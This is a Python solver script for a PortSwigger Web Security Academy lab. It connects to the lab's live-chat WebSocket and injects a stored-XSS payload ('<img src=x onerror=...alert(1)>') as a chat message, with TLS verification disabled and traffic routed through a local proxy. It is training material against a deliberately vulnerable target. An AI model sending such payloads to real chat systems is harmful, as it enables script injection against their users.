# Manipulating WebSocket messages to exploit vulnerabilities

# https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import websocket
import ssl
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def send_xss(host):
	ws = websocket.WebSocket(sslopt={"cert_reqs": ssl.CERT_NONE, "check_hostname": False})
	websock = 'wss://' + host
	chat_path = websock + '/chat'
	ws.connect(chat_path, http_proxy_host="127.0.0.1", http_proxy_port="8080", proxy_type="http")
	print('\n[+] Connecting to the chat sending "READY"...')
	ws.send("READY")
	resp = ws.recv()
	print('Response:\n\t%s' % resp)
	xss_payload = "<img src=x onerror='alert(1)'>"
	xss_msg = f'{{"message": "{xss_payload}"}}'
	print('\n[+] Sending:\n\t%s' % xss_msg)
	ws.send(str(xss_msg))
	resp = ws.recv()
	print('Response:\n\t%s' % resp)
	return resp


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Manipulating WebSocket messages to exploit vulnerabilities')
	parser = argparse.ArgumentParser(description="[+] Lab: Manipulating WebSocket messages to exploit vulnerabilities")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to send XSS through Live Chat websockets...\n')
			time.sleep(1)
			send_xss(host)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
